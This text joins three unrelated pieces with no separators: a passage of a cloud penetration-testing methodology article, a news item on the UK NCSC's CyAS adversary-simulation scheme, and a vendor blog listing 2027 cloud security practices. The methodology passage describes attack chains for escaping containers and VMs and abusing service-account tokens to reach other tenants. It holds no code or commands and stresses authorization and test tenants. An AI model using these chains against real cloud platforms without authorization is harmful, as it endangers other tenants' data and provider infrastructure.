The first two stages only produce a hypothesis that the trust boundary has been violated. The object is visible on the network and accepts requests, but that does not mean the researcher can change anything in it. Confirmed impact appears only in the last two stages, when the researcher obtains authorization and performs a controlled action beyond the original boundary. For example, network reachability of a neighboring database indicates insufficient network isolation, but cross-tenant impact appears only when the researcher can use the original context to perform an action on another tenant’s resource that the cloud model doesn’t allow, such as reading data. To keep the test ethical, the researcher demonstrates such reading only between their own test accounts, so real users’ data stays confidential.

Attacker model and three research goals

Dividing the cloud infrastructure into three layers (External, Overlay, and Underlay) helps define the attacker model for each layer. In penetration testing, the researcher can focus on one layer and look for every possible way to violate the nearest trust boundary. Another approach is to build a full attack chain across all layers. The attacker model also defines the starting point: the access level and position from which the pentest begins. Below is a general list of attacker models that apply to most cloud infrastructures:

External attacker without an account. The test covers the public attack surface, registration, the login mechanism, externally accessible services, and the path to the first tenant context. Layer: External.

Attacker with legitimate tenant access. This is the key model for a multi-tenant cloud: the tenant is entitled to create their own resources and tries to go beyond the limits those resources impose. Layer: External.

Internal attacker with a compromised runtime. The starting point is a compromised process, pod, or virtual machine. This scenario is especially relevant for supply chain attacks. The researcher explores options for lateral movement in the network and host environment. Layer: Overlay or Underlay.

Internal attacker with a compromised IAM service account token or an operator account. This model involves testing IAM and the cloud platform management processes. Layer: Overlay or Underlay.

Regardless of the attacker model and the initial entry point, the research goals at the initial stage fall into three groups.

1. Code execution first

The goal of this approach is to execute arbitrary code inside a provider-managed environment. To do this, a pentester can attack a managed database, serverless function, CI/CD workload, PaaS application, tenant virtual machine, container, or virtual network gateway.

Example of an attack chain through a managed service The pentester interacts with the managed service interface and finds a vulnerability in it (for example, CVE-2026-19478 in the case of the GitLab web interface) or in add-on modules deployed by the cloud provider. The vulnerability allows the researcher to execute code remotely inside the runtime (operating system), find an IAM service account, and use it to gain access to the resource management service. The researcher can then look for vulnerabilities in that service and penetrate the provider overlay.

Example of an attack chain through a virtual environment The chain begins with the compromise of a tenant workload. The researcher plants malicious code in a popular OS or container image in advance. A cloud tenant downloads and runs the trojanized image, and the attacker gains access inside that specific container. Next, the attacker finds ways to escape the container (using CVE-2026-43284) into the runtime: the container runtime, hypervisor, or host agent. From there, they reach the host shared with other containers and can affect the provider’s management components.

2. Credentials first

Rather than gaining access to a runtime environment, the researcher may obtain credentials that cloud services accept as valid: a service account token, metadata access credentials, an mTLS certificate, a bootstrap token, or an object storage key.

In this scenario, the move into the provider overlay doesn’t come from breaking network isolation. It happens through legitimate platform functionality. The network may be well segmented, but an over-privileged IAM service account token that the attacker manages to extract (for example, from environment variables or metadata) can legitimately call an internal API through a standard gateway or token exchange service.

3. Administrative or service context

The goal of this scenario is to bypass technical restrictions by gaining legitimate access through channels intended for staff. The route often starts with targeting people (phishing, insiders, or leaked employee or contractor credentials). However, the final entry point into the internal environment is technical: a connection through the operator’s VPN, a support portal, a remote support tool, an administrative workstation, an SSH certificate, or a serial console. Although the route often starts with compromising a person, the resulting initial zone (the technical context with certain privileges and access to resources where the researcher ends up) can match the first scenario. For example, access to a managed database host (DBaaS host) can be obtained not by exploiting a vulnerability but through a legitimate administrative channel, which is then used for privilege escalation.

Sorting out the architectural zoo

After moving deeper into the cloud infrastructure and gaining access to a node, the pentester analyzes local artifacts. Completely different architectures can hide behind the same managed service.

OpenStack-like infrastructure

IaaS services based on OpenStack usually include a large set of components: an IAM service account, compute resources, networking, images and block storage, as well as API processes, workers, a message broker, and platform state databases. A managed service built on top of such an IaaS layer can use a separate virtual machine for each database instance, several instances on a shared virtual machine, a Kubernetes cluster on virtual workers, or even a dedicated tenant for a specific product.

A message broker such as RabbitMQ is typical for OpenStack, but finding one doesn’t prove that the target is a stock OpenStack deployment. The provider may have changed the trust model, added its own API, and replaced some of the components.

Kubernetes-based platforms

In clouds of this type, a central Kubernetes cluster controls the entire infrastructure: not only containers but also virtual machines, other tenant Kubernetes clusters, and managed services. At the service runtime level, a product can run as a pod in a shared namespace, an application inside a tenant, a KubeVirt virtual machine, or a worker node of a separate cluster. From the outside, they all look like the same product, but their trust boundaries and the attack surface behind them differ radically.

Because the platform is managed through a Kubernetes cluster, where the service account token is the main unit of authorization, it’s especially important to determine where the IAM service account you obtained during the pentest lives: in a tenant cluster, in a managed cluster, or with an operator that serves multiple tenants. Identical-looking tokens may have permissions for only one pod, or they may allow changing resources in several environments at once.

Custom control plane and configuration management systems

A provider may forgo off-the-shelf platforms altogether. For example, in this kind of architecture, a provider might build its public API in-house, deploy virtual machines through libvirt or a lightweight IaaS layer, automate networking with scripts around Open vSwitch (OVS), build object storage on Ceph, and distribute node configuration through SaltStack or another configuration management system.

In this architecture, a virtual machine management service might get its settings from an internal HTTP service, a script with shared credentials might run backups, billing might receive events from a queue, and an internal agent might talk to the control plane over mTLS. Almost every component here is specific to the provider. The main risk area is not vulnerabilities in well-known products, such as those built on open-source solutions, but logic errors at the junctions between internal systems.

Mixed-stack platform

In practice, the most common setup is a mix of approaches

The infrastructure core (IaaS layer) is built on OpenStack

Kubernetes runs the managed services

The storage system runs on Ceph

IAM, billing systems, and the internal API are custom-built.

Here are some clues that can help form initial hypotheses about the environment:

A Kubernetes token and cluster DNS in the runtime environment of the host under investigation suggest that the service is running in the context of a pod.

A running qemu-guest-agent process indicates that we are inside a virtual machine rather than on a physical server.

Attached Ceph/RBD volumes point to a separate storage plane in the platform architecture, implemented as distributed block storage.

A large number of CNI or Open vSwitch (OVS) network interfaces means that this is a shared Kubernetes node

However, any such clue needs additional verification tests.

Example of a mixed-stack cloud platform

How to choose the next trust boundary

After the pentester has examined the initial zone, the next route depends on a combination of two factors:

Network visibility: which segments, services, and tenants are reachable.

Available trust level: which credentials, certificates, and API methods are accepted as valid in those segments.

Sometimes the network has almost no restrictions, but all services require correct mTLS authentication. In other cases, the network is almost completely closed, but a discovered service account can create resources across the entire region through the standard API. For this reason, network reachability (open ports) and the IAM service account must be considered together.

At this stage, the researcher usually focuses on several critical areas:

Telemetry (observability): the pentester checks whether centralized monitoring systems (logs, metrics, traces) collect data from different tenants and whether there is sufficient isolation between them. Isolation can fail if an attacker can search by other tenants’ identifiers, read raw event records, extract credentials from telemetry events, or influence alerts and automated actions.

Data storage and backup systems: this layer connects the runtime environment, the management plane, and user data. The researcher analyzes temporary restore volumes, scopes of keys, how snapshots and backups are bound to tenants, and how workers determine the owner of a resource.

Billing and quota system: the pentester checks whether a mismatch between inventory and accounting can lead to unbilled compute usage, quota bypass, or exhaustion of the provider’s resources. Critical impact here does not necessarily require remote code execution.

IAM and service account: the pentester assesses whether a token can open a path through a public or internal gateway, even with strict network segmentation. The pentester pays particular attention to the token’s scope, lifetime, tenant binding, and access to the secrets store.

Supply chain: the pentester checks container image and virtual machine image registries, installation package repositories for utilities and Kubernetes package managers, and CI/CD tool configurations. Write access to any of these components can sometimes have a greater impact than remote code execution on a single node.

Management services: the pentester examines task schedulers, message queues, inventory services, and configuration management systems. If the researcher gains such a component’s trust, there’s no need to connect to each service instance directly: the component itself can push commands and changes out to other resources.

Typical attack chains and real-world incidents

In practice, no two attack scenarios are quite alike, but a few examples show clearly how attackers violate trust boundaries.

1. From a managed database to other users’ data

The researcher deploys their own managed database and uses standard SQL statements and procedures for queries. However, an isolation flaw lets code execution escape the isolated runtime and land in the service’s shared runtime. There, the researcher finds an IAM service account token that isn’t tied to any specific managed database instance. The isolation breach is confirmed by a successful manipulation of the database of another (test) tenant.

In this case, the ability to run SQL queries was not itself a vulnerability. The critical transition occurred between the tenant context and the shared IAM service account. The result was cross-tenant impact, achieved without even needing root privileges on the host.

Similar logic was demonstrated in the public ChaosDB case: the Jupyter Notebook feature in Azure Cosmos DB created a risk of access to other tenants’ keys. This is an important example of a vulnerability in a single user-facing feature of a managed service affecting other components of the platform.

2. From a Kubernetes pod to other users’ data

The pentester launches their own container and then uses an isolation vulnerability to take control of the underlying host. On the host, the pentester finds a privileged Kubernetes service account that processes requests from the management cluster’s API. A controlled action on a neighboring pod that belongs to a second test tenant confirms the isolation breach.

This is exactly how the Azurescape chain, published by Unit 42, worked: a container escape, acquisition of a privileged IAM service account, and compromise of a multi-tenant Kubernetes cluster. What mattered here was not the container escape but the ability to obtain a service account token valid for other tenants.

3. From a public operation to changes in internal cloud resources

A user calls a standard restore, import, plug-in installation, or image build operation for a managed service. The public API validates a parameter passed to an internal worker too loosely. Exploiting a vulnerability in the worker itself leads to remote code execution or privilege compromise (write access to the container image registry or the package manager). This makes it possible to replace the target artifact with a user-provided one.

This is an example of impact at the cloud provider’s infrastructure level: an endpoint (worker) in the public API can compromise the future workloads of other tenants, even if the researcher did not scan neighboring tenants or access their data.

4. Virtual machine escape

The starting point of the research is the pentester’s own virtual machine in the cloud. A vulnerability in the virtualization system makes it possible to use a guest-to-host vector and execute arbitrary code on the host machine of the hypervisor itself. The researcher then moves from the hypervisor host to the management network or control plane, which counts as crossing the next trust boundary.

Public research shows that virtualization escapes are a real class of threats. They are most often related to errors in memory isolation mechanisms, or to vulnerabilities in shared clipboards or shared folders. However, a public CVE does not prove that a specific cloud is vulnerable. The hypervisor version, its configuration, and additional layers of protection (for example, strict OS-level policies) also affect whether an attack succeeds. Testing guest-to-host techniques in shared public infrastructure carries a high risk of destructive impact on the hypervisor itself and its virtual machines. For this reason, such testing is strictly regulated and performed only with the provider’s approval.

What counts as a pentest result

The value of cloud penetration testing lies not in the number of open ports found or in the fact that remote commands were executed, but in proven violation of trust boundaries. In our experience, cloud providers expect pentest results to answer the following critical questions:

Can an attacker from one tenant read, modify, or delete other tenants’ data?

Can user-supplied code be used to steal the token of a provider’s IAM service account or to perform actions on the account’s behalf?

Can compromising one runtime environment let an attack spread to other resources, services, a cell, or a region?

Is it possible to affect the provider’s internal technical resources from low-trust segments (for example, directly from a tenant’s virtual machine)?

Is it possible to move from the virtual environment to the host, the hypervisor, the storage system, or the physical network, and what is the real scale of the destructive impact?

For each confirmed attack vector, the report records the initial conditions, observations, alternative explanations, minimally sufficient proof, limitations, and potential damage. A negative result is also important: it shows which trust boundary relies on blind assumptions and which is enforced by controls that can withstand targeted bypass attempts in practice.

Safe confirmation of impact

Testing a provider overlay and infrastructure layer is unlike testing an ordinary external application, because mistakes cost far more. Any careless action can set off a cascade that hits a shared message queue, a management cluster, backups of several tenants, or a shared host.

Before the work starts, define the following in the rules of engagement:

Permitted accounts, tenants, regions, and infrastructure components

Allowed attack techniques and limits on load intensity

Timeframes for testing, live communication channels, and conditions for an immediate stop

Rules for handling locked accounts, credentials, and sensitive information found by accident

The procedure for testing hypotheses that go beyond the original scope of the research

To reiterate, it’s safer to confirm cross-tenant impact on a second tenant that the pentest team controls and that holds synthetic data prepared in advance. Provider-level impact is verified on a dedicated test resource or an artifact created specifically for this purpose. Passive observation is preferable to reading other people’s data, and a minimal reversible action is preferable to broad exploitation.

It’s important to distinguish between two types of engagements. A tenant owner can test their own resources within the rules of a specific cloud, but this doesn’t always give them the right to probe the provider’s infrastructure. A pentest of the provider overlay and infrastructure layer requires separate authorization from the platform owner.

Conclusion

The main job of a cloud platform is not simply to hand out resources quickly but to isolate tenants from each other securely and to delegate management to the provider’s automation. A traditional external pentest only shows whether an attacker can break in through the public attack surface. However, the real reliability of a cloud depends on whether its defenses can withstand attacks at the trust boundaries between the following platform layers:

External: the public attack surface, which includes public APIs, management consoles, IAM services, endpoints for interacting with IT services, and SDKs. Here, the pentest assesses whether an attacker can gain initial access to a tenant and compromise accounts.

Overlay (IT services): the virtual layer on the tenant side, where runtimes, operating systems, databases, and service agents operate. Tests at this layer aim to break runtime isolation and find excessive privileges of IAM service accounts. As a reminder, we split Overlay into two sublayers, because the runtime of a tenant service and the provider’s internal infrastructure have different trust boundaries and different entry points. More on that below.

Overlay (provider components): the cloud’s internal logical environment. It includes billing, backup, monitoring, and access control systems, as well as internal APIs. Attacks at this layer aim to violate the boundaries between services and tenants and find ways to interact with the control plane without authorization.

Underlay (infrastructure layer): the foundation of the platform. It includes host operating systems, virtualization systems (hypervisors), the transport network, data storage systems, baseboard management controllers (BMCs), and other low-level mechanisms. The goal of testing here is to assess virtualization isolation and the real scale of impact on neighboring workloads.

This is why an effective cloud pentest is built as a sequence of verifiable transitions between these zones. At each step, the researcher records where they started, describes the new context they’ve gained, analyzes that context’s chains of trust, and takes the minimum action needed to confirm they’ve violated the next boundary.

This systematic approach turns scattered technical findings into a measurable, proven risk for a specific user, service, or the entire cloud platform.

What’s in the next article

This article outlines the general approach: which layers exist in the cloud and where the trust boundaries between them lie. In the second article, we’ll look closely at the External layer of the cloud and at pentesting managed services from the tenant side.

The UK’s leading cybersecurity agency has officially launched a new scheme designed to help providers of critical infrastructure to test and improve their cyber resilience.

The National Cyber Security Centre (NCSC) first trailed its Cyber Adversary Simulation (CyAS) scheme at the CYBERUK 2025 conference.

It enables participating organizations to choose from a list of vetted suppliers, who then craft realistic attack plans based on reconnaissance of the client’s IT infrastructure, exposure, and threat landscape.

“Testers adopt an adversarial mindset and use appropriate tools and techniques to achieve agreed objectives, rather than being driven by commercially procured threat intelligence or constrained by documented tactics, techniques and procedures (TTPs),” the NCSC said.

Read more on cyber resilience: NCSC: Observability and Threat Hunting Must Improve

The CyAS scheme is designed to complement other NCSC initiatives including the Cyber Assessment Framework (CAF) and the associated Cyber Resilience Audit (CRA).

It’s hoped that larger organizations, CNI providers, and government bodies in particular use these frameworks to better understand their security posture and resilience.

“By enabling rigorous, realistic end-to-end assessments by the very best adversary simulation experts, CyAS will help organizations build a clearer picture of how they would stand up to genuine cyber-attacks and take action to strengthen their security and resilience,” said NCSC CTO, Ollie Whitehouse.

“Ultimately, stronger resilience across the UK helps prepare the country for crisis by protecting the essential services we all rely on every day from the most pressing threats.”

Building Resilience for the Future

Andrew Costis, engineering manager of the Adversary Research Team at AttackIQ, welcomed the program's potential to help organizations test how well they can keep essential services running during an attack.

“Building each simulation around an organization’s actual exposure should uncover weaknesses that a generic assessment might miss. Looking back, that approach could have exposed gaps in detection or containment before an intrusion became a prolonged outage,” he said.

“The longer-term opportunity is turning those findings into an ongoing practice through adversarial exposure validation.”

Costis explained that teams must repeat attack behaviors after remediating a weakness to check that the fix has worked, and adapt their testing over time as environments change.

“An assured provider gives organisations confidence in the assessment’s quality,” he concluded. “Keeping those lessons current will determine how much resilience the scheme delivers.”

CyAS will initially operate as a Minimum Viable Product (MVP), so that the NCSC can test demand, refine its methodology, and build confidence before moving towards a fuller operating model.

A list of service providers can be found here.

Cloud Security Best Practices for 2027: Secure the Data-to-AI Pipeline

November 12, 2026

Kyle Koppe

BLOG

5 min.

Have you been wondering what the prevailing cloud security best practices for 2027 might be? Unlike years past, 2027 is set to center around the data-to-AI pipeline. Data platforms, AI services and autonomous agents now run side by side across multiple clouds and the data moving between them carries the most business value and the biggest security risk. Organizations planning their 2027 security programs need practices that protect that entire movement, not just the environments on either end.

TL;DR – A critical cloud security best practice for 2027 is going to center around securing the full data-to-AI pipeline as one connected system, with protection and access policies following data from collection through model training, deployment and agentic AI use.

Key takeaways:

Own the configuration. Under the shared responsibility model, organizations are responsible for securing the AI and data services they use and default settings need tuning to each environment.

Enforce through architecture. Policy-as-code, infrastructure-as-code and automated guardrails turn security strategy into controls that hold up at scale.

Start with a baseline and build from there. Assess, plan and engineer pipeline security as a holistic motion, starting from wherever you are and building toward a scalable architecture that’s ready for what comes next.

Six Cloud Security Best Practices for 2027

Data teams and AI teams often work on different platforms with different priorities. Similarly, security programs have traditionally treated data security and AI security as separate disciplines. Moving into the coming year, organizations that secure the pipeline end-to-end will allow protection and access policies to carry forward as information moves between environments. This strategy allows them to enable new AI workloads to come online quickly without sacrificing security.

By following six interconnected practices, organizations can strengthen each individual layer of the cloud environment and then connect them into a cohesive, policy-driven foundation.

1. Treat Shared Responsibility as an AI Practice

Under the cloud shared responsibility model, the customer owns the security configuration of services such as Microsoft Copilot, Amazon Bedrock, SageMaker and Google Gemini Enterprise (Vertex AI). These services ship with default settings designed for broad use. Organizations should review and tune access controls, content filtering and model permissions to match their own data, risk tolerance and compliance obligations.

2. Classify Data Before AI Consumes It

Sensitive data discovery and classification work best when they happen early. Data security posture management (DSPM) gives teams visibility into where sensitive information lives, who can reach it and how it moves, so they can apply protection before data reaches a model or a retrieval-augmented generation (RAG) application.

3. Enforce Policy as Code

Documented policies only reduce risk when they are enforced. Policy-as-code and infrastructure-as-code let teams define security requirements once and apply them consistently across every environment, pipeline and deployment, which keeps controls aligned as cloud footprints grow.

4. Govern Every Identity, Human and Non-Human

AI workloads and agents act as identities in the cloud and they can accumulate permissions quickly. Mapping entitlements, enforcing least privilege and reviewing privileged access for data and AI administrators help limit the reach of any single account or agent.

5. Build Compliance Into the Architecture

AI-specific frameworks such as the EU AI Act, NIST AI RMF and the CSA AI Controls Matrix sit alongside established requirements such as GDPR, HIPAA and PCI DSS. Aligning architecture to these frameworks from the start creates audit-ready governance and reduces rework as new regulations take effect.

6. Secure the Data-to-AI Pipeline as One System

This is the practice the others point toward. Before data reaches a model or agent, teams copy, combine and transform it across databases, storage systems, SaaS platforms and processing pipelines. At each stage, organizations need to preserve data integrity, understand sensitivity and origin and limit access to sensitive information.

Frequently Asked Questions

What are the top cloud security best practices for 2027?

Key cloud security best practices for 2027 include owning the security configuration of cloud AI services, classifying data before AI consumes it, enforcing policy as code, governing human and non-human identities, building compliance into the architecture and securing the full data-to-AI pipeline as one connected system.

What is the data-to-AI pipeline?

The data-to-AI pipeline is the path data takes from collection and preparation through storage, transformation, model training, deployment and use by generative and agentic AI applications. It typically spans databases, storage systems, SaaS platforms and processing pipelines across multiple clouds.

Why is securing the data-to-AI pipeline a cloud security best practice?

AI models and agents are only as trustworthy as the data they rely on. Securing the pipeline end to end preserves data integrity, tracks sensitivity and origin and keeps access policies in place as data moves between environments and new AI workloads are introduced.

Who is responsible for securing cloud AI services like Copilot, Bedrock and Vertex AI?

The customer is. Cloud providers secure the underlying infrastructure, but the customer owns configuration, access controls, content filtering and model permissions for AI services. Default settings are designed for broad use, not your risk profile.

What is policy-as-code?

Policy-as-code is the practice of writing security rules as machine-readable code that deploys automatically with infrastructure. It eliminates manual configuration and ensures every environment gets the same controls from day one.

What is DSPM and how does it support AI security?

DSPM continuously discovers and classifies sensitive data across cloud environments. For AI security, it identifies which data AI models can access, flags overexposed training sets and tracks data lineage from source to model.

Which AI regulations and frameworks should cloud security programs plan for in 2027?

Organizations should plan for AI-specific frameworks such as the EU AI Act, NIST AI RMF, the CSA AI Controls Matrix and state AI legislation, alongside established requirements such as GDPR, HIPAA and PCI DSS.
